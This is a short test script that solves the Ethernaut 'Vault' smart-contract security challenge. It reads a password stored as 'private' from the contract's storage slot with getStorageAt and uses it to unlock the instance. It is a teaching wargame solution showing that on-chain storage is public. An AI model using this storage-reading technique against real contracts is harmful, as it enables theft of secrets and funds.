// # Ethernaut 8: Vault

import {ethers} from 'hardhat'
import {Contract, providers, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0xf94b476063B6379A3c8b6C836efB8B3e10eDe188'
const INSTANCE_ADDRESS = '0x66d6f3858650386f9aC2c21dD28f1C6377102e6A'

describe('08 Vault', () => {
  let ethernaut: Contract
  let instance: Contract
  let signer: Signer
  let signerAddress: string
  let provider: providers.Provider

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Vault', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
    provider = signer.provider!
  })

  // The password for `Vault` is in the instance's storage and can simply
  // be read using `getStorageAt`.
  it('reads password from storage and unlocks instance', async () => {
      const pw = await provider.getStorageAt(instance.address, 1)
      const tx = await instance.unlock(pw)
      return expectStatusOK(tx)
  })

  it('verifies instance is unlocked', async () => {
      expect(await instance.locked()).to.be.false
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
